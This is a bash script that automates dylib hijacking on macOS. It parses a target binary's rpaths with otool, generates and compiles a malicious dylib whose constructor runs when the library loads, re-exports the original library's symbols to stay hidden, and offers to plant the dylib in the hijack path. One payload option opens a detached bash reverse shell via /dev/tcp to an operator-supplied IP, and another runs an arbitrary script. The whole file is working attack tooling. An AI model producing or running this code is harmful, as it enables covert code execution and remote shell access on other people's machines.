#!/bin/bash
#
# Automatic Dylib Hijacking Script
#
# This script automates the process of creating and deploying a hijacking dylib
# for a specified target binary and dylib path.
#
# Usage: ./auto_hijack.sh <target_binary> <dylib_to_hijack> <output_dylib> [payload_option]
#
# Payload options:
#   1 - Simple logging payload (default)
#   2 - Create reverse shell
#   3 - Run custom script
#

# Color definitions
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default values
PAYLOAD_OPTION=1
REVERSE_SHELL_IP="127.0.0.1"
REVERSE_SHELL_PORT="4444"
CUSTOM_SCRIPT="/tmp/custom_script.sh"

# Banner
echo -e "${BLUE}===============================================${NC}"
echo -e "${BLUE}     Automatic Dylib Hijacking Script         ${NC}"
echo -e "${BLUE}===============================================${NC}"

# Check arguments
if [ "$#" -lt 3 ]; then
    echo -e "${RED}Usage: $0 <target_binary> <dylib_to_hijack> <output_dylib> [payload_option]${NC}"
    echo -e "Payload options:"
    echo -e "  1 - Simple logging payload (default)"
    echo -e "  2 - Create reverse shell"
    echo -e "  3 - Run custom script"
    exit 1
fi

TARGET_BINARY="$1"
DYLIB_TO_HIJACK="$2"
OUTPUT_DYLIB="$3"

if [ "$#" -ge 4 ]; then
    PAYLOAD_OPTION="$4"
fi

# Check if files exist
if [ ! -f "$TARGET_BINARY" ]; then
    echo -e "${RED}[-] Target binary does not exist: $TARGET_BINARY${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Creating hijacking dylib for ${TARGET_BINARY}${NC}"
echo -e "${GREEN}[+] Target dylib: ${DYLIB_TO_HIJACK}${NC}"

# Create temporary directory
TMP_DIR=$(mktemp -d)
TMP_SOURCE="${TMP_DIR}/hijack.c"

# Get version info from original dylib
echo -e "${GREEN}[+] Extracting version info...${NC}"
COMPAT_VERSION=$(/usr/bin/otool -l "$TARGET_BINARY" | grep -A 4 "$DYLIB_TO_HIJACK" | grep "compatibility version" | awk '{print $3}')
CURRENT_VERSION=$(/usr/bin/otool -l "$TARGET_BINARY" | grep -A 4 "$DYLIB_TO_HIJACK" | grep "current version" | awk '{print $3}')

if [ -z "$COMPAT_VERSION" ] || [ -z "$CURRENT_VERSION" ]; then
    echo -e "${YELLOW}[!] Could not determine version info, using defaults (1.0.0)${NC}"
    COMPAT_VERSION="1.0.0"
    CURRENT_VERSION="1.0.0"
else
    echo -e "${GREEN}[+] Found version info: current=${CURRENT_VERSION}, compatibility=${COMPAT_VERSION}${NC}"
fi

# Resolve original dylib path
ORIGINAL_DYLIB_PATH=""

# If dylib starts with @rpath, we need to resolve it
if [[ "$DYLIB_TO_HIJACK" == @rpath* ]]; then
    echo -e "${GREEN}[+] Resolving @rpath in ${DYLIB_TO_HIJACK}${NC}"
    
    # Get all rpaths
    RPATHS=$(/usr/bin/otool -l "$TARGET_BINARY" | grep -A 2 "LC_RPATH" | grep "path" | awk '{print $2}')
    
    if [ -z "$RPATHS" ]; then
        echo -e "${RED}[-] No LC_RPATH commands found in binary${NC}"
        echo -e "${YELLOW}[!] Will create dylib without re-exporting symbols (may cause crashes)${NC}"
    else
        # Extract just the dylib name without @rpath/
        DYLIB_NAME=${DYLIB_TO_HIJACK/@rpath\//}
        
        echo -e "${GREEN}[+] Dylib name: ${DYLIB_NAME}${NC}"
        echo -e "${GREEN}[+] Checking rpaths:${NC}"
        
        # Try to find the original dylib in rpaths
        for RPATH in $RPATHS; do
            # Resolve @loader_path or @executable_path
            if [[ "$RPATH" == @loader_path* ]]; then
                RESOLVED_PATH="${RPATH/@loader_path/$(dirname "$TARGET_BINARY")}"
            elif [[ "$RPATH" == @executable_path* ]]; then
                RESOLVED_PATH="${RPATH/@executable_path/$(dirname "$TARGET_BINARY")}"
            else
                RESOLVED_PATH="$RPATH"
            fi
            
            FULL_PATH="${RESOLVED_PATH}/${DYLIB_NAME}"
            echo -e "    Checking ${FULL_PATH}"
            
            if [ -f "$FULL_PATH" ]; then
                ORIGINAL_DYLIB_PATH="$FULL_PATH"
                echo -e "${GREEN}[+] Found original dylib at: ${ORIGINAL_DYLIB_PATH}${NC}"
                break
            fi
        done
    fi
elif [ -f "$DYLIB_TO_HIJACK" ]; then
    # Direct path to dylib
    ORIGINAL_DYLIB_PATH="$DYLIB_TO_HIJACK"
    echo -e "${GREEN}[+] Found original dylib at: ${ORIGINAL_DYLIB_PATH}${NC}"
fi

# Choose payload based on option
echo -e "${GREEN}[+] Creating payload for option ${PAYLOAD_OPTION}${NC}"

case $PAYLOAD_OPTION in
    2)
        # Ask for reverse shell details
        echo -e "${BLUE}[*] Reverse shell payload selected${NC}"
        read -p "Enter your IP address [$REVERSE_SHELL_IP]: " input
        REVERSE_SHELL_IP=${input:-$REVERSE_SHELL_IP}
        
        read -p "Enter port number [$REVERSE_SHELL_PORT]: " input
        REVERSE_SHELL_PORT=${input:-$REVERSE_SHELL_PORT}
        
        echo -e "${GREEN}[+] Will create reverse shell to ${REVERSE_SHELL_IP}:${REVERSE_SHELL_PORT}${NC}"
        ;;
    3)
        # Ask for custom script path
        echo -e "${BLUE}[*] Custom script payload selected${NC}"
        read -p "Enter path to your custom script [$CUSTOM_SCRIPT]: " input
        CUSTOM_SCRIPT=${input:-$CUSTOM_SCRIPT}
        
        if [ ! -f "$CUSTOM_SCRIPT" ]; then
            echo -e "${RED}[-] Custom script does not exist: $CUSTOM_SCRIPT${NC}"
            echo -e "${YELLOW}[!] Creating a template script at this location${NC}"
            
            cat > "$CUSTOM_SCRIPT" << EOF
#!/bin/bash
# This is a template for your custom payload
# It will be executed when the dylib is loaded

# Log the execution
echo "\$(date): Custom script executed from dylib hijacking" >> /tmp/dylib_hijack.log

# Add your custom commands here
# For example:
# touch /tmp/dylib_hijack_proof.txt
# id > /tmp/dylib_hijack_id.txt
EOF
            chmod +x "$CUSTOM_SCRIPT"
            echo -e "${GREEN}[+] Template script created at: $CUSTOM_SCRIPT${NC}"
            echo -e "${GREEN}[+] Please edit this script with your payload${NC}"
        fi
        
        echo -e "${GREEN}[+] Will run custom script: ${CUSTOM_SCRIPT}${NC}"
        ;;
    *)
        # Default to simple logging payload
        echo -e "${BLUE}[*] Simple logging payload selected${NC}"
        ;;
esac

# Create source code for hijacking dylib
echo -e "${GREEN}[+] Creating source code at ${TMP_SOURCE}${NC}"

# Header section
cat > "$TMP_SOURCE" << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>
#include <time.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <pwd.h>

// Path to the original dylib (if needed for manual loading)
#define ORIGINAL_DYLIB "${ORIGINAL_DYLIB_PATH}"

// For storing handle to original dylib if manually loaded
static void *original_handle = NULL;

// Get formatted timestamp
char* get_timestamp() {
    time_t rawtime;
    struct tm* timeinfo;
    static char buffer[80];
    
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", timeinfo);
    return buffer;
}

// Log to both console and syslog
void log_message(const char* format, ...) {
    char buffer[1024];
    va_list args;
    
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    
    // Log to stdout (may not be visible depending on application)
    printf("%s\n", buffer);
    
    // Log to syslog
    syslog(LOG_ERR, "%s", buffer);
    
    // Also log to file for persistence
    FILE *f = fopen("/tmp/dylib_hijack.log", "a");
    if (f) {
        fprintf(f, "[%s] %s\n", get_timestamp(), buffer);
        fclose(f);
    }
}

// Function to get user information
void log_user_info() {
    uid_t uid = getuid();
    uid_t euid = geteuid();
    struct passwd *pw = getpwuid(uid);
    
    log_message("UID=%d, EUID=%d", uid, euid);
    if (pw) {
        log_message("Username: %s", pw->pw_name);
    }
}

// Function executed when dylib is loaded
__attribute__((constructor))
static void initialize(int argc, const char **argv) {
    // Get process info
    pid_t pid = getpid();
    char proc_path[1024] = {0};
    
    // Try to get executable path
    if (argv && argv[0]) {
        strncpy(proc_path, argv[0], sizeof(proc_path) - 1);
    } else {
        strcpy(proc_path, "unknown");
    }
    
    // Log basic information
    log_message("[+] Dylib hijack successful in %s (PID: %d)", proc_path, pid);
    log_message("[+] Timestamp: %s", get_timestamp());
    log_user_info();
    
EOF

# Add specific payload based on option
case $PAYLOAD_OPTION in
    2)
        # Reverse shell payload
        cat >> "$TMP_SOURCE" << EOF
    // Create reverse shell
    log_message("[+] Attempting to create reverse shell to ${REVERSE_SHELL_IP}:${REVERSE_SHELL_PORT}");
    
    // Fork a child process to avoid hanging the application
    pid_t child_pid = fork();
    if (child_pid == 0) {
        // This is the child process
        // Detach from parent completely
        if (fork() == 0) {
            // Close standard file descriptors
            close(0); close(1); close(2);
            
            // Construct shell command
            char cmd[256];
            snprintf(cmd, sizeof(cmd), 
                "/bin/bash -c '/bin/bash -i >& /dev/tcp/${REVERSE_SHELL_IP}/${REVERSE_SHELL_PORT} 0>&1'");
            
            // Execute command
            system(cmd);
            exit(0);
        }
        exit(0);
    }
EOF
        ;;
    3)
        # Custom script payload
        cat >> "$TMP_SOURCE" << EOF
    // Execute custom script
    log_message("[+] Executing custom script: ${CUSTOM_SCRIPT}");
    
    // Fork a child process to avoid hanging the application
    pid_t child_pid = fork();
    if (child_pid == 0) {
        // This is the child process
        // Detach from parent completely
        if (fork() == 0) {
            // Close standard file descriptors
            close(0); close(1); close(2);
            
            // Check if script exists and is executable
            struct stat st;
            if (stat("${CUSTOM_SCRIPT}", &st) == 0 && (st.st_mode & S_IXUSR)) {
                // Execute script
                system("${CUSTOM_SCRIPT}");
            } else {
                syslog(LOG_ERR, "Custom script not found or not executable: ${CUSTOM_SCRIPT}");
            }
            exit(0);
        }
        exit(0);
    }
EOF
        ;;
    *)
        # Simple logging payload - nothing more to add
        ;;
esac

# Add re-export code if original dylib was found
if [ ! -z "$ORIGINAL_DYLIB_PATH" ]; then
    cat >> "$TMP_SOURCE" << EOF
    
    // We're using -Wl,-reexport_library during compilation
    // No need to manually load the original dylib here
}

// Function that runs when the dylib is unloaded
__attribute__((destructor))
static void cleanup(void) {
    log_message("[+] Dylib being unloaded");
}
EOF
else
    cat >> "$TMP_SOURCE" << EOF
    
    // No original dylib found, so we have nothing to re-export
    // This may cause the application to crash if it depends on symbols
    // from the original dylib
}

// Function that runs when the dylib is unloaded
__attribute__((destructor))
static void cleanup(void) {
    log_message("[+] Dylib being unloaded");
}
EOF
fi

# Compile the hijacking dylib
echo -e "${GREEN}[+] Compiling hijacking dylib${NC}"

COMPILE_CMD="gcc -dynamiclib -current_version $CURRENT_VERSION -compatibility_version $COMPAT_VERSION -framework Foundation $TMP_SOURCE -o $OUTPUT_DYLIB"

if [ ! -z "$ORIGINAL_DYLIB_PATH" ]; then
    COMPILE_CMD="$COMPILE_CMD -Wl,-reexport_library,$ORIGINAL_DYLIB_PATH"
    echo -e "${GREEN}[+] Re-exporting symbols from ${ORIGINAL_DYLIB_PATH}${NC}"
else
    echo -e "${YELLOW}[!] Original dylib not found, not re-exporting symbols${NC}"
    echo -e "${YELLOW}[!] WARNING: This may cause crashes if the application depends on symbols from the original dylib${NC}"
fi

echo -e "${GREEN}[+] Compile command: ${COMPILE_CMD}${NC}"
eval $COMPILE_CMD

if [ $? -ne 0 ]; then
    echo -e "${RED}[-] Compilation failed${NC}"
    rm -rf "$TMP_DIR"
    exit 1
fi

# Fix the path in the dylib if necessary
if [ ! -z "$ORIGINAL_DYLIB_PATH" ] && [[ "$DYLIB_TO_HIJACK" == @rpath* ]]; then
    echo -e "${GREEN}[+] Fixing path references in the compiled dylib${NC}"
    install_name_tool -change "$DYLIB_TO_HIJACK" "$ORIGINAL_DYLIB_PATH" "$OUTPUT_DYLIB"
    
    if [ $? -ne 0 ]; then
        echo -e "${RED}[-] Failed to fix path references${NC}"
    fi
fi

# Cleanup
rm -rf "$TMP_DIR"

echo -e "${GREEN}[+] Hijacking dylib created successfully: ${OUTPUT_DYLIB}${NC}"

# Determine target location
TARGET_LOCATION=""
if [[ "$DYLIB_TO_HIJACK" == @rpath* ]]; then
    DYLIB_NAME=${DYLIB_TO_HIJACK/@rpath\//}
    
    # Get the first rpath directory
    FIRST_RPATH=$(/usr/bin/otool -l "$TARGET_BINARY" | grep -A 2 "LC_RPATH" | grep "path" | head -1 | awk '{print $2}')
    
    if [[ ! -z "$FIRST_RPATH" ]]; then
        if [[ "$FIRST_RPATH" == @loader_path* ]]; then
            RESOLVED_PATH="${FIRST_RPATH/@loader_path/$(dirname "$TARGET_BINARY")}"
            TARGET_LOCATION="${RESOLVED_PATH}/${DYLIB_NAME}"
        elif [[ "$FIRST_RPATH" == @executable_path* ]]; then
            RESOLVED_PATH="${FIRST_RPATH/@executable_path/$(dirname "$TARGET_BINARY")}"
            TARGET_LOCATION="${RESOLVED_PATH}/${DYLIB_NAME}"
        else
            TARGET_LOCATION="${FIRST_RPATH}/${DYLIB_NAME}"
        fi
    fi
else
    TARGET_LOCATION="$DYLIB_TO_HIJACK"
fi

if [[ ! -z "$TARGET_LOCATION" ]]; then
    echo -e "${YELLOW}[!] To complete the hijack, copy the dylib to:${NC}"
    echo -e "    $TARGET_LOCATION"
    
    TARGET_DIR=$(dirname "$TARGET_LOCATION")
    if [ ! -d "$TARGET_DIR" ]; then
        echo -e "${YELLOW}[!] Directory does not exist, you may need to create it:${NC}"
        echo -e "    mkdir -p \"$TARGET_DIR\""
    fi
    
    echo -e "${YELLOW}[!] Command to copy the dylib:${NC}"
    echo -e "    cp \"$OUTPUT_DYLIB\" \"$TARGET_LOCATION\""
    
    # Ask if user wants to deploy automatically
    read -p "Would you like to deploy the dylib to the target location? (y/n): " deploy_answer
    if [[ "$deploy_answer" == "y" || "$deploy_answer" == "Y" ]]; then
        if [ ! -d "$TARGET_DIR" ]; then
            echo -e "${YELLOW}[!] Creating directory: $TARGET_DIR${NC}"
            mkdir -p "$TARGET_DIR"
        fi
        
        echo -e "${GREEN}[+] Copying dylib to target location...${NC}"
        cp "$OUTPUT_DYLIB" "$TARGET_LOCATION"
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] Dylib deployed successfully!${NC}"
            
            # Set appropriate permissions
            chmod 755 "$TARGET_LOCATION"
            
            echo -e "${GREEN}[+] To test the hijack, run:${NC}"
            echo -e "    $TARGET_BINARY"
        else
            echo -e "${RED}[-] Failed to deploy dylib. You may need higher privileges.${NC}"
            echo -e "${YELLOW}[!] Try manually with:${NC}"
            echo -e "    sudo cp \"$OUTPUT_DYLIB\" \"$TARGET_LOCATION\""
        fi
    fi
else
    echo -e "${YELLOW}[!] Could not determine target location automatically.${NC}"
    echo -e "${YELLOW}[!] You will need to manually place the dylib in the appropriate location.${NC}"
fi

echo -e "${BLUE}===============================================${NC}"
echo -e "${BLUE}     Dylib Hijacking Setup Complete           ${NC}"
echo -e "${BLUE}===============================================${NC}"

exit 0